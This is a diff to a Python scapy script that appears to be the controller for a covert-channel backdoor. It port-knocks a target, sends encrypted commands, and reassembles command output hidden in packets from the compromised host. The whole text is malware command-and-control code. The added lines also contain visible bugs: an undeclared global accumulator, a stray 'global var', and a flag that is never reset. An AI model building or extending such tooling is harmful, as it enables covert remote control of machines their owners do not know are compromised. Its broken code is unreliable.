@@ -1,8 +1,13 @@
 #!/usr/bin/python
 
-import time, configfile, logging, encryption
+import time, configfile, logging, encryption, packetFunctions
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
+
+# flag to determine when to stop reading the results of a command and decrypt everything
+flag = False
+
+encryptedResults = ""
 
 def portKnock():
     for knock in configfile.knock:
@@ -18,13 +23,27 @@ def sendCommand(protocol, data, password):
     send(packet)
 
 def recvCommand(packet):
-   if packet.haslayer(IP) and packet.haslayer(Raw):
-        data = encryption.decrypt(packet['Raw'].load, configfile.password)
-        if data.startswith(configfile.password):
-            data = data[len(configfile.password):]
-            print data
+   global flag
+   if packet.haslayer(IP):
+    if packet[IP].src == configfile.ip:
+        dataReceived = packetFunctions.parsePacket(packet)
+        encryptedResults += dataReceived
+        # encrypted data should be a string of either 1 or 2 characters
+        # appent those characters to the global encrypted string
+        if packet.haslayer(Raw):
+            if packet[Raw].load == configfile.password:
+                flag = True
+                decryptedData = encryption.decrypt(encryptedResults, configfile.password)
+                print decryptedData
+                # decrypt that global encrypted string here, print it, and then set it to "" again
+
+        # data = encryption.decrypt(packet['Raw'].load, configfile.password)
+        # if data.startswith(configfile.password):
+        #     data = data[len(configfile.password):]
+        #     print data
 
 def main():
+    global var
     portKnock()
 
     while 1:
